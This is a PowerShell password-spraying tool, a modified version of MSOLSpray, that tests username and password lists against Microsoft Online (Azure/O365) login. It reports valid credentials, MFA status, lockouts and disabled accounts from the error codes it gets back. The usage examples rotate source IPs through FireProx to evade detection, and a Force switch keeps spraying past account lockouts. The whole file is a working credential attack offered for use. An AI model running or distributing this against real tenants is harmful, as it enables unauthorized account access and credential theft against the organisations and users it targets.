function Invoke-Spray {
    <#
        .SYNOPSIS
            This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
            MSOLSpray Function: Invoke-Sprayer
            Author: Rogier Dijkman (@dijkmanrogier)
            Original: Beau Bullock (@dafthack)
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
            This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
        .PARAMETER UserList
            UserList file filled with usernames one-per-line in the format "user@domain.com"
        .PARAMETER Password
            A single password that will be used to perform the password spray.
        .PARAMETER OutFile
            A file to output valid results to.
        .PARAMETER Force
            Forces the spray to continue and not stop when multiple account lockouts are detected.
        .PARAMETER URL
            The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
        .EXAMPLE
            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -Passwords Pass@word123!
            Description
            -----------
            This command will use the provided userlist and attempt to authenticate to each account with a password of Pass@word123!.
        .EXAMPLE
            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -Passwords @('P@ssword', '123456789') -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
            Description
            -----------
            This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
        .EXAMPLE
            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -PasswordList .\passwordlist.txt -OutFile valid-users.txt
            Description
            -----------
            This command uses the specified password file to spray and writes the output to a file.
    #>
    Param(
        [Parameter(Mandatory = $False,
            Position = 0)]
        [string]$UserList = "",

        [Parameter(Mandatory = $False,
            Position = 1)]
        [array]$Passwords = "",

        [Parameter(Mandatory = $False,
            Position = 2)]
        [string]$PasswordList = "",

        [Parameter(Mandatory = $False,
            Position = 3)]
        [string]$OutFile = "",

        [Parameter(Mandatory = $False,
            Position = 4)]
        [switch]$Force
    )

    $ErrorActionPreference = 'silentlycontinue'
    $usernames = Get-Content $UserList
    $count = $Usernames.count
    $curr_user = 0
    $lockout_count = 0
    $lockoutquestion = 0
    $fullresults = @()

    if ($PasswordList) {
        $Passwords = Get-Content $PasswordList
    }
    Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
    Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
    $currenttime = Get-Date
    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"

    # Setting up the web request
    $requestParams = @{
        Method = 'POST'
        Uri    = "https://login.microsoftonline.com/common/oauth2/token"
        Body   = @{
            resource    = 'https://graph.windows.net'
            client_info = '1'
            grant_type  = 'password'
            client_id   = '1b730954-1685-4b74-9bfd-dac224a7b894'
            scope       = 'openid'
        }
    }

    foreach ($username in $usernames) {
        # User counter
        $curr_user += 1
        Write-Host -nonewline "$curr_user of $count users tested`r"

        $requestParams.Body.username = $username
        foreach ($password in $Passwords ) {
            $requestParams.Body.password = $password
            $webrequest = Invoke-WebRequest @requestParams -ErrorVariable ErrMsg

            # If we get a 200 response code it's a valid cred
            if ($webrequest.StatusCode -eq "200") {
                Write-Host "SUCCESS: $username : $password" -ForegroundColor Green
                $webrequest = ""
                $fullresults += "$username : $password"
            }
            else {
                # Check the response for indication of MFA, tenant, valid user, etc...
                # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
                # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes#aadsts-error-codes

                switch (($ErrMsg.ErrorRecord | ConvertFrom-Json).error_codes) {
                    "50055" {
                        # User password is expired
                        Write-Host "SUCCESS: $username : $password - NOTE: The user's password is expired." -ForegroundColor Green
                        $fullresults += "$username : $password - password expired"
                    }
                    "50135" {
                        # password change is required due to account risk
                        Write-Host "SUCCESS: $username : $password - NOTE: The user's password needs to be changed." -ForegroundColor Green
                        $fullresults += "$username : $password - password expired"
                    }
                    "50144" {
                        # User's Active Directory password has expired.
                        Write-Host "SUCCESS: $username : $password - NOTE: The user's Active Directory password has expired." -ForegroundColor Green
                        $fullresults += "$username : $password - password expired"
                    }
                    "50158" {
                        # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
                        Write-Host "SUCCESS: $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use." -ForegroundColor Green
                        $fullresults += "$username : $password - MFA / Conditional Access used"
                    }
                ("50079" -or "50076") {
                        # Microsoft MFA response
                        Write-Host "SUCCESS: $username : $password - NOTE: The response indicates MFA (Microsoft) is in use." -ForegroundColor Green
                        $fullresults += "$username : $password - MFA used"
                    }
                    "50053" {
                        # Locked out account or Smart Lockout in place
                        Write-Warning "The account $username appears to be locked."
                        $lockout_count++
                        $fullresults += "$username - account locked"
                    }
                    "50126" {
                        # Standard invalid password
                        continue
                    }
                    "53011" {
                        #User blocked due to risk on home tenant
                        Write-Warning "User blocked due to risk on home tenant"
                    }
                    ("50128" -or "50059") {
                        # Invalid Tenant Response
                        Write-Warning "Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                    }
                    "50034" {
                        # Invalid Username
                        Write-Warning "The user $username doesn't exist."
                    }
                    "50057" {
                        # Disabled account
                        Write-Warning "The account $username appears to be disabled."
                        $fullresults += "$username : - account disabled"
                    }
                    default {
                        # Unknown errors
                        Write-Warning "Got an error we haven't seen yet for user $username"
                        Write-Warning (($ErrMsg.ErrorRecord | ConvertFrom-Json).error_description)
                    }
                }
            }
        }

        # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
        if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0) {
            $title = "WARNING! Multiple Account Lockouts Detected!"
            $message = "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Continues the password spray."

            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Cancels the password spray."

            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
            $lockoutquestion++
            if ($result -ne 0) {
                Write-Host "[*] Cancelling the password spray."
                Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                break
            }
        }
    }

    # Output to file
    if ($OutFile -ne "") {
        if ($fullresults) {
            $fullresults | Out-File -Encoding ascii $OutFile
            Write-Output "Results have been written to $OutFile."
        }
    }
}
